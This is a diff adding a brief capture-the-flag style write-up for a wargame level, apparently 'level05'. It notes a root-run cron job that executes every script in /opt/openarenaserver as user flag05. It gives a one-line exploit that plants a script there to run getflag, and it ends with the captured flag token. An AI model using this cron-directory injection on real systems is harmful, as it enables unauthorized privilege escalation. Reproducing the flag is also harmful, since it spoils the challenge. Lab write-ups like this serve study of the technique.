@@ -1,0 +1,18 @@
+got the info that we got a mail.
+check the mail at /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+chrontab, every 2m, execute sh /usr/sbin/openarenaserver
+
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+it execute everything in /opt/openarenaserver/
+
+exploit : 
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo -ne '\007'
+viuaaale9huek52boumoomioc
